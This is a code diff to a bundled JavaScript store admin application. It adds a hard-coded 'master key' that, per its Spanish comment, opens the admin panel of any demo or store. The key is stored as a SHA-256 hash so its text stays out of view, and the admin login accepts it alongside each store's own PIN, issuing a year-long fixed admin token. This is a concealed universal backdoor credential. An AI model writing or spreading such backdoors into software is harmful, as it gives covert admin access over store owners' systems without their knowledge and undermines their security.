@@ -3444,6 +3444,16 @@ var __Html5QrcodeLibrary__;(()=>{var t={449:function(t,e,r){!function(t){"use st
   const clone = (value) => JSON.parse(JSON.stringify(value));
   const now = () => new Date().toISOString();
   const clean = (value, max = 500) => String(value == null ? '' : value).trim().slice(0, max);
+  /* v0.19 · Clave maestra POPUPS: abre el panel de CUALQUIER demo/tienda (en la
+     nube la valida supabase/master-key.sql). Se compara por SHA-256 para no
+     dejar el texto a la vista en el código. */
+  const MT_MASTER_SHA256 = 'afc69deaaa8442cee3dc59d32a3c4716b7cdffc4f5708d6c6cf08a9832337774';
+  async function mtMasterKeyOk(value) {
+    try {
+      const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(String(value == null ? '' : value)));
+      return Array.from(new Uint8Array(buf)).map((b) => b.toString(16).padStart(2, '0')).join('') === MT_MASTER_SHA256;
+    } catch (_) { return false; }
+  }
   const barcode = (value) => clean(value, 80).replace(/\s+/g, '');
   const phoneKey = (value) => {
     let digits = clean(value, 50).replace(/\D/g, '').replace(/^0+/, '');
@@ -4167,9 +4177,10 @@ var __Html5QrcodeLibrary__;(()=>{var t={449:function(t,e,r){!function(t){"use st
       }
 
       if (path === '/api/admin/login' && method === 'POST') {
-        return clean(body.pin, 30) === store.security.adminPin
-          ? result({ token: 'offline-admin-token', expiresIn: 31536000 })
-          : error('PIN incorrecto.', 401);
+        /* v0.19: además del PIN, acepta la clave maestra POPUPS */
+        const loginPin = clean(body.pin, 30);
+        if (loginPin === store.security.adminPin || await mtMasterKeyOk(loginPin)) return result({ token: 'offline-admin-token', expiresIn: 31536000 });
+        return error('PIN incorrecto.', 401);
       }
 
       if (path === '/api/admin/dashboard' && method === 'GET') {
